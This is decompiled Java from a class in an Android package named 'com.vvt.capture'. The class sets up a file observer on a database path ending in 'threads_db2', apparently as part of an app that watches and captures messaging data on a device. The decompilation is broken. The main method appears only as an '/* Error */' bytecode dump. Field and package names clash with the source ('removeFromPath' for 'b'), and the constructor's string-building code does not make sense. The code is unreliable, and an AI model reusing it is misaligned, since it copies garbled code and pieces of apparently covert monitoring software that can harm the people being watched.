package com.vvt.capture.b.a;

import java.io.File;

class e
  extends f
{
  String a;
  boolean b;
  
  e(d paramd, String paramString, int paramInt)
  {
    super(paramd, paramString, paramInt);
    Object localObject = new java/lang/StringBuilder;
    ((StringBuilder)localObject).<init>();
    String str = a();
    localObject = ((StringBuilder)localObject).append(str);
    str = File.separator;
    localObject = str + "threads_db2";
    this.a = ((String)localObject);
    this.b = false;
  }
  
  /* Error */
  public void onEvent(int paramInt, String paramString)
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: invokestatic 47	com/vvt/capture/removeFromPath/a/d:removeFromPath	()Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: aload_0
    //   11: getfield 42	com/vvt/capture/removeFromPath/a/e:removeFromPath	Z
    //   14: istore_3
    //   15: iload_3
    //   16: ifne +173 -> 189
    //   19: new 30	java/io/File
    //   22: astore 4
    //   24: aload_0
    //   25: getfield 40	com/vvt/capture/removeFromPath/a/e:a	Ljava/lang/String;
    //   28: astore 5
    //   30: aload 4
    //   32: aload 5
    //   34: invokespecial 50	java/io/File:<init>	(Ljava/lang/String;)V
    //   37: aload 4
    //   39: invokevirtual 53	java/io/File:exists	()Z
    //   42: istore_3
    //   43: iload_3
    //   44: ifeq +134 -> 178
    //   47: iconst_1
    //   48: istore_3
    //   49: aload_0
    //   50: iload_3
    //   51: putfield 42	com/vvt/capture/removeFromPath/a/e:removeFromPath	Z
    //   54: invokestatic 47	com/vvt/capture/removeFromPath/a/d:removeFromPath	()Z
    //   57: istore_3
    //   58: iload_3
    //   59: ifeq +3 -> 62
    //   62: aload_0
    //   63: getfield 12	com/vvt/capture/removeFromPath/a/e:MyUncaughtExceptionHandler	Lcom/vvt/capture/removeFromPath/a/d;
    //   66: astore 4
    //   68: aload 4
    //   70: invokestatic 57	com/vvt/capture/removeFromPath/a/d:a	(Lcom/vvt/capture/removeFromPath/a/d;)Ljava/util/HashSet;
    //   73: astore 4
    //   75: aload 4
    //   77: aload_0
    //   78: invokevirtual 63	java/util/HashSet:remove	(Ljava/lang/Object;)Z
    //   81: pop
    //   82: invokestatic 47	com/vvt/capture/removeFromPath/a/d:removeFromPath	()Z
    //   85: istore_3
    //   86: iload_3
    //   87: ifeq +3 -> 90
    //   90: aload_0
    //   91: invokevirtual 66	com/vvt/capture/removeFromPath/a/e:stopWatching	()V
    //   94: invokestatic 47	com/vvt/capture/removeFromPath/a/d:removeFromPath	()Z
    //   97: istore_3
    //   98: iload_3
    //   99: ifeq +3 -> 102
    //   102: invokestatic 47	com/vvt/capture/removeFromPath/a/d:removeFromPath	()Z
    //   105: istore_3
    //   106: iload_3
    //   107: ifeq +3 -> 110
    //   110: new 4	com/vvt/capture/removeFromPath/a/f
    //   113: astore 4
    //   115: aload_0
    //   116: getfield 12	com/vvt/capture/removeFromPath/a/e:MyUncaughtExceptionHandler	Lcom/vvt/capture/removeFromPath/a/d;
    //   119: astore 5
    //   121: aload_0
    //   122: getfield 40	com/vvt/capture/removeFromPath/a/e:a	Ljava/lang/String;
    //   125: astore 6
    //   127: iconst_2
    //   128: istore 7
    //   130: aload 4
    //   132: aload 5
    //   134: aload 6
    //   136: iload 7
    //   138: invokespecial 16	com/vvt/capture/removeFromPath/a/f:<init>	(Lcom/vvt/capture/removeFromPath/a/d;Ljava/lang/String;I)V
    //   141: aload 4
    //   143: invokevirtual 70	com/vvt/capture/removeFromPath/a/f:startWatching	()V
    //   146: aload_0
    //   147: getfield 12	com/vvt/capture/removeFromPath/a/e:MyUncaughtExceptionHandler	Lcom/vvt/capture/removeFromPath/a/d;
    //   150: astore 5
    //   152: aload 5
    //   154: invokestatic 57	com/vvt/capture/removeFromPath/a/d:a	(Lcom/vvt/capture/removeFromPath/a/d;)Ljava/util/HashSet;
    //   157: astore 5
    //   159: aload 5
    //   161: aload 4
    //   163: invokevirtual 73	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   166: pop
    //   167: invokestatic 47	com/vvt/capture/removeFromPath/a/d:removeFromPath	()Z
    //   170: istore_3
    //   171: iload_3
    //   172: ifeq +3 -> 175
    //   175: aload_0
    //   176: monitorexit
    //   177: return
    //   178: invokestatic 47	com/vvt/capture/removeFromPath/a/d:removeFromPath	()Z
    //   181: istore_3
    //   182: iload_3
    //   183: ifeq -8 -> 175
    //   186: goto -11 -> 175
    //   189: invokestatic 47	com/vvt/capture/removeFromPath/a/d:removeFromPath	()Z
    //   192: istore_3
    //   193: iload_3
    //   194: ifeq -19 -> 175
    //   197: goto -22 -> 175
    //   200: astore 4
    //   202: aload_0
    //   203: monitorexit
    //   204: aload 4
    //   206: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	207	0	this	e
    //   0	207	1	paramInt	int
    //   0	207	2	paramString	String
    //   5	189	3	bool	boolean
    //   22	140	4	localObject1	Object
    //   200	5	4	localObject2	Object
    //   28	132	5	localObject3	Object
    //   125	10	6	str	String
    //   128	9	7	i	int
    // Exception table:
    //   from	to	target	type
    //   2	5	200	finally
    //   10	14	200	finally
    //   19	22	200	finally
    //   24	28	200	finally
    //   32	37	200	finally
    //   37	42	200	finally
    //   50	54	200	finally
    //   54	57	200	finally
    //   62	66	200	finally
    //   68	73	200	finally
    //   77	82	200	finally
    //   82	85	200	finally
    //   90	94	200	finally
    //   94	97	200	finally
    //   102	105	200	finally
    //   110	113	200	finally
    //   115	119	200	finally
    //   121	125	200	finally
    //   136	141	200	finally
    //   141	146	200	finally
    //   146	150	200	finally
    //   152	157	200	finally
    //   161	167	200	finally
    //   167	170	200	finally
    //   178	181	200	finally
    //   189	192	200	finally
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */